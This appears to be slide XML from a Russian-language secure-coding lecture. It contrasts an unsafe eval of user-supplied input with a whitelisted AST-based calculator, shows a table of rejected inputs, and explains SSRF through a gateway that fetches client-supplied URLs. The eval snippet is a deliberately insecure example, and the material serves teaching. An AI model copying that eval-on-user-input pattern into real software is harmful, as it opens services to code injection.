        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="bad">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C91F1DC6-AD03-4006-BF95-E7DBB04AE8DB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sign = data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"sign"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answer = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650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eval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sign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4" name="risk">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58AA876F-B370-4725-AEB9-E31163D3F930}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2971800"/>
            <a:ext cx="26289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Вызовы функций</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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и доступ к именам</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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тоже выражения.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="limits-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F903D17-034A-4695-916D-623B378C15FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4152900"/>
            <a:ext cx="2628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Ограничения</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="limits">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{610DCEFB-F537-48E3-AFC0-87B5DE4D7C3A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26289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5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Имена и вызовы функций запрещены.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1575" b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00000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="15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Лимиты: 120 символов, глубина 12, |v| ≤ 10⁶.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1575" b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00000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="15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Ошибки ввода: HTTP 400.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="good-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{946E1774-CB56-4C69-86DE-B1FF17FCA825}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3638550" y="1609725"/>
            <a:ext cx="7867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Как надо: явный разбор арифметики</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="calculator">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91408FFB-DAB2-455B-984F-FE5D9F58DF69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3638550" y="2047875"/>
            <a:ext cx="7867650" cy="461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ast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operator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op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4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OPS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ast.Add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op.add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ast.Sub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op.sub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ast.Mult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op.mul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ast.Div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op.truediv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ast.UAdd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op.pos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ast.USub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op.neg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F4474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 err="1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safe_calculate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type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str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or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 err="1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&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425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120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raise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 err="1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ValueError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"input"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25" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F4474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calc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n, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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depth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25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depth &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425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12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raise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 err="1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ValueError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"depth"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type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ast.Constant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v = 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n.value</a:t>
            </a:r>
            <a:endParaRPr sz="1425" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="D4D4D4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type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v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 dirty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425" b="0" dirty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float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raise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 err="1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ValueError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()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25" b="0" dirty="0" err="1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elif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type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ast.BinOp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and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type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n.op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4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OPS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v = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OPS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25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type</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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n.op</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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](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    calc</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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n.left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depth+</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425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25" b="0" dirty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calc</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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n.right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depth+</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425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25" b="0" dirty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25" b="0" dirty="0" err="1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elif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type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ast.UnaryOp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and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type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n.op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4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OPS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v = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>OPS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25" b="0" dirty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type</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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n.op</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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](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calc</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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n.operand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depth+</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425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25" b="0" dirty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raise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 err="1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ValueError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"syntax"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-</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425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1e6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&lt;= v &lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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1e6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raise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25" b="0" dirty="0" err="1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ValueError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"range"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v</a:t>
            </a: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25" b="0" dirty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calc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 dirty="0" err="1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ast.parse</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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s, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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mode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25" b="0" dirty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"eval"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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25" b="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.body</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1425" b="0" dirty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pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Рисунок 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3000DB86-4361-4596-9367-8E731FC9D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87048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CF18DC94-B400-4A92-9E9F-A222B7CF551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Калькулятор: разрешённые выражения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CE48949C-BB60-4B33-A425-6646D3481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28" name="v7-text-431">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFB840CA-B1C9-410A-9765-9E5A4235B0E7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Разрешены числа и операции +, −, *, /, унарные + и −</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="29" name="Таблица 28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{766ADF89-435D-42BF-8FF7-AD157E17699E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2381250"/>
          <a:ext cx="10820400" cy="3143250"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"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875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Ввод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875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Проверка дерева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875" b="1">
                          <a:solidFill>
                            <a:srgbClr val="C9707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Результат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>
                      <a:solidFill>
                        <a:srgbClr val="405063"/>
                      </a:solidFill>
                      <a:prstDash val="soli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0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B5CEA8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  <a:r>
                        <a:rPr sz="1725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+ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8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  <a:r>
                        <a:rPr sz="1725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* </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8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Constant и BinOp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</a:rPr>
                        <a:t>len</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="FFD700"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0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</a:rPr>
                        <a:t>'alex'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="FFD700"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>)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Узел Call запрещён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user.name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Узел Attribute запрещён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B5CEA8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  <a:r>
                        <a:rPr sz="1725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** </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>9999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Операция Pow запрещена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B5CEA8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  <a:r>
                        <a:rPr sz="1725" b="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</a:rPr>
                        <a:t> / </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="B5CEA8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anchor="ctr">
                    <a:lnL w="7620">
                      <a:solidFill>
                        <a:srgbClr val="405063"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Деление на ноль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sz="1725" b="0">
                          <a:solidFill>
                            <a:srgbClr val="EEF2F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405063"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="7620" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="40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405063"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="17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088046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50F08167-D472-46C6-9245-DE71DCF1C678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HTTP: gateway и сервис контента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0E9EAD25-364B-4DA6-8192-CA042A2FE9C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Gateway загружает страницу другого сервиса и возвращает полученный контент пользователю.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="user-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7FCC929E-8530-4516-99FD-6E570771DED2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Пользователь передаёт URL страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="process-node-gateway">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97B426C4-A143-4505-B741-1EDA928E8850}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3190875"/>
            <a:ext cx="4000500" cy="2238375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8D9B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gateway-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1561998B-C875-4E37-B59F-3CA12CF65362}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="819150" y="3362325"/>
            <a:ext cx="3733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Gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="gateway-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B30471B-D948-41BD-8F4E-AF642E0FA941}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3790950"/>
            <a:ext cx="3695700" cy="1552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Принимает запрос клиента</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Отправляет GET страницы</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Использует полученный ответ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="process-node-content">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0674E58-9326-4BD7-BD6F-D2EF74435000}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7505700" y="3190875"/>
            <a:ext cx="4000500" cy="2238375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8D9B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content-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5D489AD-1900-4DF3-8665-843A52A6DC33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7639050" y="3362325"/>
            <a:ext cx="3733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Сервис контента</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="content-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C102E8F-960D-4116-B080-6FB3EB8373A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7658100" y="3790950"/>
            <a:ext cx="3695700" cy="1552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Принимает HTTP-запрос</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Читает нужный ресурс</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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Возвращает HTML или данные</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="10" name="flow-get">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1C9F5E36-D6CC-4DDD-A4BD-6ABEFF2FEE6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4686300" y="3790950"/>
            <a:ext cx="2819400" cy="0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1" name="flow-label-get">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F85991F5-17D3-4F90-81E2-C79929A2B323}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="3333750"/>
            <a:ext cx="247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GET страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="flow-content">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2EC5460-FB29-461E-BAC5-B05E031732CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4686300" y="4895850"/>
            <a:ext cx="2819400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="flow-label-content">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8A8F0E42-0CD4-4AB2-9CC8-51A5100D21AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="5019675"/>
            <a:ext cx="247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HTML / данные</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1DDA6F8-6541-4BB2-8754-7A9010BD070D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2686050" y="2847975"/>
            <a:ext cx="0" cy="342900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5" name="response">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61A87218-26E9-439C-AFCE-0ABAFDA5B143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191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Gateway передаёт контент в ответе клиенту.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Рисунок 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD222BF9-5452-48EB-B931-A8EF7A45F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66617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>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A05A424-6761-43CA-890E-EB40BCB3BBB8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SSRF: управление запросом сервера</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="lead">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66144B70-7880-404D-81CF-F3920A1DB59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Server-Side Request Forgery - управление исходящим запросом сервера через недоверенные URL и параметры.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="input-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FCDF0EBC-44CC-4C35-8FEF-88AA1D854983}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2486025"/>
            <a:ext cx="2095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Данные пользователя</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="controlled">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A3FBE8E-6580-462C-8009-9980064A58CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3324225"/>
            <a:ext cx="2095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url</a:t>
            </a:r>
          </a:p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headers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="process-node-gateway">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D508C257-5029-4870-B570-29D8F529B21C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3562350" y="2686050"/>
            <a:ext cx="3105150" cy="2714625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gateway-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{08072C64-6A8C-46D1-8AE4-CEA2B452FBDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3676650" y="3505200"/>
            <a:ext cx="2876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Gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="gateway-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0654B7C9-11F9-46A1-B03E-BA55823CF0D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3714750" y="3990975"/>
            <a:ext cx="28003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Берёт url и headers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из запроса клиента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Отправляет запрос</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="process-node-internal">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{770F4250-5665-4BFB-9854-060F8F79EFB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8401050" y="2686050"/>
            <a:ext cx="3105150" cy="2714625"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="20003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internal-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD9F85D6-7AAB-4C9B-8126-1FB9742A8C06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8515350" y="3505200"/>
            <a:ext cx="2876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Целевой сервис</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="internal-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{695393D1-1F8D-48B9-A7F9-986B6F9C24A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8553450" y="3990975"/>
            <a:ext cx="28003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Внутренняя сеть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Запрос от gateway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Проверка авторизации</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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Данные в ответе</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="flow-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E64B983-151B-47E6-B3F3-FDAE5DBF5A76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2314575" y="3905250"/>
            <a:ext cx="1247775" cy="0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2" name="flow-label-input">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B311A4B4-A462-4F95-8789-5D1D02DEE34E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2343150" y="3248025"/>
            <a:ext cx="1190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2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2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Влияет на</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
